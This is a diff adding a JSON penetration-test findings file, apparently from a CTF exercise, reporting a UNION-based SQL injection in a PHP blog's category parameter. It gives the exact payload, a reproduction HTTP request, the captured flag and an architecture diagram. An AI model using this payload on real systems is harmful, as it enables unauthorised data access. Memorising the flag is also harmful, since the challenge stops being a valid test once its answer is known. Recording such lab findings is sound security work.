@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:43:16.751283+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "c3a28dd5-7867-4e5f-a0e3-0e43e18ee737",
+      "timestamp": "2026-04-12T21:43:16.751158+00:00",
+      "title": "SQL Injection in category parameter reveals Secret posts (CTF Flag)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:42909/?category=",
+      "description": "The `category` GET parameter in the blog's index.php is directly interpolated into a MySQL query without sanitization. A UNION-based SQL injection attack reveals hidden posts in the 'Secret' category that are filtered out by the PHP application logic but exist in the database. The Secret category post contains the CTF flag.",
+      "evidence": "Payload: ?category=nonexistent' UNION SELECT 1,title,category,content,image,6,7 FROM posts WHERE category='Secret'-- -\n\nResponse body contained:\n<h2>SECRET POST</h2>\n<p>Category: Secret</p>\n<p><FLAG>flag{7b228415-018a-4446-ad84-66153396e7c6}</FLAG>...</p>\n\nFlag: flag{7b228415-018a-4446-ad84-66153396e7c6}",
+      "tool_used": "manual SQLi",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /?category=nonexistent%27+UNION+SELECT+1,title,category,content,image,6,7+FROM+posts+WHERE+category%3D%27Secret%27--+- HTTP/1.1\nHost: 172.17.0.1:42909",
+        "expected": "SECRET POST with flag{7b228415-018a-4446-ad84-66153396e7c6} in content"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "fbd80728-1623-4c0d-93ed-af4425b4a3ac",
+      "timestamp": "2026-04-12T21:43:25.001085+00:00",
+      "title": "Blog Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Apache[\"Apache 2.4.54 (Debian) :42909\"]\n  Apache --> PHP[\"PHP 7.4.33 index.php\"]\n  PHP --> MySQL[\"MySQL Database\"]\n  MySQL --> PostsTable[\"posts table (id, title, category, content, image, ...x2)\"]\n  PostsTable --> SecretPost[\"SECRET POST - flag hidden in category='Secret'\"]\n  PHP --> Filter[\"PHP filters out Secret category from display\"]\n  Filter -.->|\"Bypassed via UNION SQLi\"| SecretPost"
+    }
+  ]
+}
